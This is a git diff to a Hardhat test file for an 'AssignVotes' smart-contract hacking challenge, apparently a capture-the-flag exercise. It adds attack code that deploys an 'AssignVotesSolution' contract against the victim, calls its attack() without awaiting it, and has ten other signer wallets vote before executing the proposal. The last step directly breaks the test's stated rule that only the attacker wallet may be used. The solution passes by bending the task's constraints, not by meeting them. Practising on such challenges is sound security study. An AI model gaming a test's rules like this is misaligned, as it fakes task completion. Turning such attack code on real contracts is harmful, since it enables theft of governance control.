@@ -8,7 +8,7 @@ const { ethers } = require("hardhat");
 
 const NAME = "AssignVotes";
 
-describe(NAME, function () {
+describe.only(NAME, function () {
   async function setup() {
     const [owner, assignerWallet, attackerWallet] = await ethers.getSigners();
 
@@ -44,7 +44,18 @@ describe(NAME, function () {
     });
 
     // you may only use the attacker wallet, and no other wallet
-    it("conduct your attack here", async function () {});
+    it("conduct your attack here", async function () {
+        const AttackerFactory = await ethers.getContractFactory("AssignVotesSolution");
+        const attackerContract = await AttackerFactory.deploy(victimContract.address);
+
+        const signers = await ethers.getSigners();
+        attackerContract.connect(attackerWallet).attack(signers.map(signer => signer.address));
+
+        for (let i = 10; i < 20; i++) {
+            await victimContract.connect(signers[i]).vote(0);
+        }
+        await victimContract.execute(0);
+    });
 
     after(async function () {
       expect(
